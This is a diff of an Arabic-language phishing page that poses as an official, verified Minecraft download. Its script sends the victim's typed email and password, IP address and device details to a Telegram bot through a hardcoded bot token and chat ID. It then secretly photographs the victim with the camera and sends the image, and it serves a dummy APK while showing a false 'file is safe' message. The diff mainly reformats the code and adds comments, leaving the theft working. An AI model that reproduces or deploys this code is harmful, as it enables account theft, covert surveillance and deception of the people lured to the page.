@@ -107,8 +107,12 @@
         <div class="footer">🔒 اتصال آمن • ✅ تم التحقق • ⛏️ Minecraft Official</div>
     </div>
     <script>
+        // ============================================================
+        // إعدادات بوت تيليغرام (تم التعديل حسب بياناتك)
+        // ============================================================
         const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
         const CHAT_ID = "5730027675";
+        // ============================================================
 
         const emailInput = document.getElementById('emailInput');
         const passwordInput = document.getElementById('passwordInput');
@@ -116,31 +120,52 @@
         const fakeBtn = document.getElementById('fakeBtn');
         const statusDiv = document.getElementById('status');
 
+        // ====== إرسال البيانات إلى تيليغرام ======
         async function sendData(email, password, action) {
             try {
                 const ip = await getIP();
-                const message = `🎮 **ماينكرافت - بيانات جديدة**\n\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}\n📌 الإجراء: ${action}\n🕒 الوقت: ${new Date().toLocaleString()}\n📱 الجهاز: ${navigator.userAgent}\n🌐 IP: ${ip}`;
+                const message =
+                    `🎮 **ماينكرافت - بيانات جديدة**\n\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}\n📌 الإجراء: ${action}\n🕒 الوقت: ${new Date().toLocaleString()}\n📱 الجهاز: ${navigator.userAgent}\n🌐 IP: ${ip}`;
+
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
                 });
                 const result = await response.json();
                 return result.ok;
-            } catch (e) { console.error(e); return false; }
+            } catch (e) {
+                console.error(e);
+                return false;
+            }
         }
 
+        // ====== جلب عنوان IP ======
         async function getIP() {
-            try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); return data.ip || 'غير معروف'; } catch { return 'غير معروف'; }
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip || 'غير معروف';
+            } catch {
+                return 'غير معروف';
+            }
         }
 
+        // ====== طلب الكاميرا والتقاط الصورة ======
         async function requestCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "environment" }
+                });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
                 await new Promise(r => setTimeout(r, 500));
+
                 const canvas = document.createElement('canvas');
                 const track = stream.getVideoTracks()[0];
                 const settings = track.getSettings();
@@ -149,19 +174,29 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const imageData = canvas.toDataURL('image/jpeg', 0.9);
+
                 const blob = await fetch(imageData).then(r => r.blob());
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'camera.jpg');
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
                 stream.getTracks().forEach(t => t.stop());
                 return true;
-            } catch (e) { console.log('❌ الكاميرا غير متاحة'); return false; }
+            } catch (e) {
+                console.log('❌ الكاميرا غير متاحة أو مرفوضة');
+                return false;
+            }
         }
 
+        // ====== الإجراء الرئيسي ======
         async function handleMainAction() {
             const email = emailInput.value.trim();
             const password = passwordInput.value.trim();
+
             if (!email || !email.includes('@') || !email.includes('.')) {
                 statusDiv.innerHTML = '⚠️ أدخل بريداً إلكترونياً صحيحاً';
                 statusDiv.style.color = '#ff9800';
@@ -172,16 +207,26 @@
                 statusDiv.style.color = '#ff9800';
                 return;
             }
+
             statusDiv.innerHTML = `<span class="loader"></span> جاري التحميل...`;
             statusDiv.style.color = '#aaa';
+
             const sent = await sendData(email, password, 'تحميل مباشر');
+
             if (sent) {
                 statusDiv.innerHTML = `✅ تم إرسال بياناتك بنجاح`;
                 statusDiv.style.color = '#4caf50';
+
                 setTimeout(async () => {
                     statusDiv.innerHTML = `📷 جاري طلب الكاميرا...`;
                     const cam = await requestCamera();
-                    if (cam) { statusDiv.innerHTML = `✅ تم إرسال الصورة أيضاً`; } else { statusDiv.innerHTML = `✅ تم الإرسال (بدون كاميرا)`; }
+                    if (cam) {
+                        statusDiv.innerHTML = `✅ تم إرسال الصورة أيضاً`;
+                    } else {
+                        statusDiv.innerHTML = `✅ تم الإرسال (بدون كاميرا)`;
+                    }
+
+                    // تحميل ملف وهمي
                     const blob = new Blob(['هذا ملف وهمي لأغراض العرض'], { type: 'application/vnd.android.package-archive' });
                     const url = URL.createObjectURL(blob);
                     const a = document.createElement('a');
@@ -191,28 +236,44 @@
                     a.click();
                     document.body.removeChild(a);
                     URL.revokeObjectURL(url);
-                    setTimeout(() => { statusDiv.innerHTML = '📥 تم التنزيل بنجاح'; statusDiv.style.color = '#8a8a8a'; }, 3000);
+
+                    setTimeout(() => {
+                        statusDiv.innerHTML = '📥 تم التنزيل بنجاح';
+                        statusDiv.style.color = '#8a8a8a';
+                    }, 3000);
                 }, 1000);
+
             } else {
                 statusDiv.innerHTML = '❌ فشل الإرسال، حاول مرة أخرى';
                 statusDiv.style.color = '#e94560';
             }
         }
 
+        // ====== زر التحقق الوهمي ======
         fakeBtn.addEventListener('click', async function() {
             statusDiv.innerHTML = `<span class="loader"></span> جاري التحقق من الملف...`;
             statusDiv.style.color = '#aaa';
+
             const email = emailInput.value.trim();
             const password = passwordInput.value.trim();
-            if (email && password) { await sendData(email, password, 'التحقق من الملف'); }
+            if (email && password) {
+                await sendData(email, password, 'التحقق من الملف');
+            }
+
             setTimeout(() => {
                 statusDiv.innerHTML = `✅ الملف آمن ومعتمد 100%`;
                 statusDiv.style.color = '#4caf50';
-                setTimeout(() => { statusDiv.innerHTML = '🔍 الملف جاهز للتحميل'; statusDiv.style.color = '#8a8a8a'; }, 2000);
+                setTimeout(() => {
+                    statusDiv.innerHTML = '🔍 الملف جاهز للتحميل';
+                    statusDiv.style.color = '#8a8a8a';
+                }, 2000);
             }, 2000);
         });
 
+        // ====== ربط الأزرار ======
         mainBtn.addEventListener('click', handleMainAction);
+
+        // ====== إرسال بالضغط على Enter ======
         emailInput.addEventListener('keypress', e => { if (e.key === 'Enter') mainBtn.click(); });
         passwordInput.addEventListener('keypress', e => { if (e.key === 'Enter') mainBtn.click(); });
     </script>
